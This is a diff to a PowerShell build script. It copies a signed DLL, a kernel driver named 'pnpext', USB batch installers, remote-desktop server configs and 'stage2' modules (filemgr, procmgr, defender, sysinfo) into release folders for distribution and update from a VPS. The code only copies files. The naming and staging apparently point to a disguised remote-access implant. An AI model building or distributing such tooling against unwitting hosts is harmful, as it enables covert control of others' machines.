@@ -60,4 +60,51 @@ Write-Host ""
 Write-Host "[4/4] Signing build\bin\pnpext.dll..."
 & powershell -NoProfile -ExecutionPolicy Bypass -File _sign_dll.ps1 2>&1 |
     Select-Object -Last 10
+
+# Post-sign: mirror DLL + BAT installers to dist\usb and release\HOST
+Write-Host ""
+Write-Host "[5/5] Mirroring binaries to dist\usb and release\HOST..."
+$null = New-Item -ItemType Directory -Force -Path "dist\usb"
+$null = New-Item -ItemType Directory -Force -Path "release\HOST"
+$null = New-Item -ItemType Directory -Force -Path "release\VPS"
+
+Copy-Item -Force "build\bin\pnpext.dll" "dist\usb\pnpext.dll"
+Copy-Item -Force "build\bin\pnpext.dll" "release\HOST\pnpext.dll"
+Write-Host "  pnpext.dll  -> dist\usb + release\HOST"
+
+# BAT installers (source of truth is dist\usb)
+foreach ($bat in @("install-cmd.bat","install-web-cmd.bat","uninstall-cmd.bat")) {
+    $src = "dist\usb\$bat"
+    if (Test-Path $src) {
+        Copy-Item -Force $src "release\HOST\$bat"
+        Write-Host "  $bat -> release\HOST"
+    }
+}
+
+# VPS server files
+foreach ($f in @("server.py","index.html","admin_dashboard.html","nginx.conf","nginx-remote-desktop.conf","deploy-vps.sh","deploy-vps2.sh","MANUAL.html","MANUAL.md")) {
+    if (Test-Path $f) {
+        Copy-Item -Force $f "release\VPS\$f"
+        Write-Host "  $f -> release\VPS"
+    }
+}
+# Config editor EXE → HOST (built separately via _build_config_editor.bat)
+$editorExe = "build_static\editor_dist\pnpext_config_editor.exe"
+if (Test-Path $editorExe) {
+    Copy-Item -Force $editorExe "release\HOST\pnpext_config_editor.exe"
+    Write-Host "  pnpext_config_editor.exe -> release\HOST"
+}
+# Update binaries -> VPS (served at /var/www/remote-desktop/files/ for host updates)
+$null = New-Item -ItemType Directory -Force -Path "release\VPS\stage2"
+Copy-Item -Force "build\bin\pnpext.dll" "release\VPS\pnpext.dll"
+Copy-Item -Force "dist\usb\pnpext.sys"  "release\VPS\pnpext.sys"
+Write-Host "  pnpext.dll + pnpext.sys -> release\VPS"
+foreach ($m in @("filemgr","procmgr","defender","sysinfo")) {
+    $src = "build\stage2\$m.dll"
+    if (Test-Path $src) {
+        Copy-Item -Force $src "release\VPS\stage2\$m.dll"
+        Write-Host "  $m.dll -> release\VPS\stage2\"
+    }
+}
+Write-Host "[5/5] Done."
 exit 0
